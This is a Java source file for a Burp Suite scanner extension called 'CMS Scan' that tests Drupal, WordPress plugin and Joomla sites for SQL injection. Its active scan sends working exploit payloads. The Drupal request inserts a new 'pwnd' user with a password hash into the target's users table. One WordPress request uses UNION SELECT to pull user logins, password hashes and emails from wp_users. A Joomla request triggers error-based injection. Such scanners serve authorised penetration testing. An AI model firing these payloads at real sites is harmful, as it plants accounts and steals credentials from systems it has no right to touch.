package burp;

import java.util.ArrayList;
import java.util.List;

public class BurpExtender implements IBurpExtender, IScannerCheck
{
	
	IBurpExtenderCallbacks callback;
    IExtensionHelpers halp;
    IResponseInfo oresponse, response;
    IRequestInfo orequest;
    String req, res, bodyInfo, headerInfo, 
    			oreq, ores, oReqBodyInfo, oReqHeaderInfo, oResBodyInfo, oResHeaderInfo;
    List<IScanIssue> wassup = new ArrayList<IScanIssue>();
    IHttpRequestResponse nrr;
    String SPMP = "page=simple-personal-message-outbox&action=view&message=0%20UNION%20SELECT%201,2.3,user_login,5,user_pass,7,user_email,9,10,11,12%20FROM%20wp_users%20WHERE%20id=1";
    String WPJ = "/wp-admin/edit.php?post_type=job&page=WPJobsJobApps&jobid=5 UNION ALL SELECT NULL,NULL,NULL,@@version,NULL,NULL-- comment";
    List<String> nh;
    List<IScanIssue> issues = new ArrayList<IScanIssue>();
    JOOMLA j;
    DRUPAL d;
    WP1 wp1;
    WP2 wp2;
    
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
    	this.callback = callbacks;
     	halp = callback.getHelpers();
    	
    	callback.setExtensionName("CMS Scan");
    	callback.printOutput("CMS Scan has successfully installed.");
    	callback.registerScannerCheck(this);
    }

	@Override
	public List<IScanIssue> doPassiveScan(IHttpRequestResponse check) {

		return null;
	}

	@Override
	public List<IScanIssue> doActiveScan(IHttpRequestResponse check,
			IScannerInsertionPoint insertionPoint) {
		
		if(issues.isEmpty() == false)
		{
			issues.clear();
		}
		
		orequest = halp.analyzeRequest(check.getRequest());
		oreq = new String(check.getRequest());
		oReqBodyInfo = oreq.substring(orequest.getBodyOffset());
		oReqHeaderInfo = oreq.substring(0, orequest.getBodyOffset());
		
		oresponse = halp.analyzeResponse(check.getResponse());
		ores = new String(check.getResponse());
		oResBodyInfo = ores.substring(oresponse.getBodyOffset());
		oResHeaderInfo = ores.substring(0, oresponse.getBodyOffset());
        
        nrr = callback.makeHttpRequest(check.getHttpService(), 
        		halp.buildHttpMessage(halp.analyzeRequest(check).getHeaders(), 
        				"name[0;insert%20into%20users%20values%20(99999,'pwnd','%24S%24DIkdNZqdxqh7Tmufxs8l1vAu0wdzxF%2F%2FsmWKAcjCv45KWjK0YFBg','pwnd@pwnd.pwn','','',NULL,0,0,0,1,NULL,'',0,'',NULL);#%20%20]=test&name[0]=test&pass=test&form_id=user_login_block&op=Log+in".getBytes()));

		response = halp.analyzeResponse(nrr.getResponse());
		res = new String(nrr.getResponse());
		bodyInfo = res.substring(response.getBodyOffset());
		headerInfo = res.substring(0, response.getBodyOffset());
		
		if(bodyInfo.toLowerCase().contains("id=\"edit-name\" name=\"name\" value=\"test test\"") &&
				bodyInfo.toLowerCase().contains("drupal"))
		{
			if(d == null)
			{
				d = new DRUPAL(nrr, halp.analyzeRequest(nrr).getUrl(), callback, halp);
				issues.add(d);
			}
		}

		if(oReqHeaderInfo.contains("wp-admin"))
		{
			nh = halp.analyzeRequest(check).getHeaders();
			nh.set(0, nh.get(0).split("/wp-admin/")[0] + "/wp-admin/edit.php?post_type=job&page=WPJobsJobApps&jobid=5+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2C%40%40version%2CNULL%2CNULL--+comment HTTP/1.1");
			
	        nrr = callback.makeHttpRequest(check.getHttpService(), 
	        		halp.buildHttpMessage(nh, oReqBodyInfo.getBytes()));

			response = halp.analyzeResponse(nrr.getResponse());
			res = new String(nrr.getResponse());
			bodyInfo = res.substring(response.getBodyOffset());
			headerInfo = res.substring(0, response.getBodyOffset());

			if(response.getStatusCode() == 200 &&
					bodyInfo.toLowerCase().contains("<td>") &&
					bodyInfo.toLowerCase().contains("</td>") &&
					bodyInfo.toLowerCase().contains("wordpress") &&
							(bodyInfo.toLowerCase().contains("ubuntu") ||
							bodyInfo.toLowerCase().contains("sql server") ||
							bodyInfo.toLowerCase().contains("tomcat") ||
							bodyInfo.toLowerCase().contains("redhat") ||
							bodyInfo.toLowerCase().contains("mysql") ||
							bodyInfo.toLowerCase().contains("windows")))
			{
				if(wp1 == null)
				{
					wp1 = new WP1(nrr, halp.analyzeRequest(nrr).getUrl(), callback, halp);
					issues.add(wp1);
				}
			}		
		}

		if(oReqHeaderInfo.contains("wp-admin"))
		{
			nh = halp.analyzeRequest(check).getHeaders();
			nh.set(0, nh.get(0).split("/wp-admin/")[0] + "/wp-admin/admin.php?page=simple-personal-message-outbox&action=view&message=0%20UNION%20SELECT%201,2.3,user_login,55318961455,user_pass,7,user_email,9,10,11,12%20FROM%20wp_users%20WHERE%20id=1 HTTP/1.1");
			
	        nrr = callback.makeHttpRequest(check.getHttpService(), 
	        		halp.buildHttpMessage(nh, oReqBodyInfo.getBytes()));

			response = halp.analyzeResponse(nrr.getResponse());
			res = new String(nrr.getResponse());
			bodyInfo = res.substring(response.getBodyOffset());
			headerInfo = res.substring(0, response.getBodyOffset());

			if(response.getStatusCode() == 200 &&
					bodyInfo.toLowerCase().contains("55318961455") &&
					bodyInfo.toLowerCase().contains("@") &&
					bodyInfo.toLowerCase().contains(".com") &&
					bodyInfo.toLowerCase().contains("wordpress"))
			{
				if(wp2 == null)
				{
					wp2 = new WP2(nrr, halp.analyzeRequest(nrr).getUrl(), callback, halp);
					issues.add(wp2);
				}
			}		
		}

		if(oReqHeaderInfo.contains("/administrator/"))
		{
			nh = halp.analyzeRequest(check).getHeaders();
			nh.set(0, nh.get(0).split("/administrator/")[0] + "/administrator/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' HTTP/1.1");
			
	        nrr = callback.makeHttpRequest(check.getHttpService(), 
	        		halp.buildHttpMessage(nh, oReqBodyInfo.getBytes()));
	        
			response = halp.analyzeResponse(nrr.getResponse());
			res = new String(nrr.getResponse());
			bodyInfo = res.substring(response.getBodyOffset());
			headerInfo = res.substring(0, response.getBodyOffset());
			
			if(bodyInfo.toLowerCase().contains("you have an error in your sql syntax") &&
				bodyInfo.toLowerCase().contains("joomla"))
			{
				if(j == null)
				{
					j = new JOOMLA(nrr, halp.analyzeRequest(nrr).getUrl(), callback, halp);
					issues.add(j);
				}
			}		
		}
		
		return issues;
	}


	@Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
		// TODO Auto-generated method stub
		return 0;
	}
}
